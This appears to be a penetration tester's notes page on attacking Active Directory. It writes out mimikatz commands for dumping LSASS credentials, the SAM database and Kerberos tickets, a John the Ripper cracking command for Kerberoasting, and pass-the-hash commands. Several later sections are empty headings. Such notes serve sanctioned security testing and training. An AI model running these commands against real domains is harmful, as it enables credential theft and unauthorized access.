# Active Directory

When testing active directory our goals should be to:

* gain a foothold on a machine on the domain and elevate our privileges
* enumerate the domain to find additional accounts, users, etc. that ideally increase our privilege level on the domain
* gain access to the domain controller
* persist on the domain (situation dependent)

Assuming that we've already [enumerated](../3.-enumeration/active-directory.md) the domain, we should now be focused on gathering credentials to move laterally within the domain.

### Cached credential retrieval

Several tools are available to help us retrieve stored credentials. My preferred tool is mimikatz.

#### Mimikatz

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords (dump lsass)
lsadump::sam (dump sam database)
sekurlsa::tickets (to dump tickets stored in memory)
kerberos::list (view cached kerberos tickets for the current user)
```

### Service account attacks

#### Kerberoasting

If we find interesting service accounts while enumerating we can use mimikatz to export the tickets for offline cracking.

```
kerberos::list /export
```

We can then use John the Ripper to crack the tickets.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Alternatively, we canuse the **Invoke-Kerberoast.ps1,** to enumerate SPNs, request tickets, and export them in a format ready for cracking.

### Lateral movement

Moving laterally within a domain is fairly straightforward once you have credentials.

#### Windows remote management

```
winrs -remote:hostname -u:username -p:password (command)
```

#### PS-Remoting

\*\*

#### PS-EXEC



#### SMB-EXEC



#### Pass the hash

Pass the hash allows attackers to authenticate to a remote system using an NTLM hash. This attack will not work with Kerberos.&#x20;

{% hint style="info" %}
Many PTH tools require both the LM and NTLM hash as part of the command. If the LM hash is not available you can use a string of 32 zeros in its place.
{% endhint %}

* Passing-the-Hash Toolkit

```
pth-winexe -U Administrator%$LMHash:$NTLMHash //$ipaddress cmd
```

* Mimikatz

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:test.local /ntlm:$hash
```

#### Overpass the hash

The overpass the hash technique utilizes the NTLM hash to obtain a Kerberos ticket, thus avoiding NTLM authentication.

#### Pass the ticket



### Persistence

#### Golden tickets
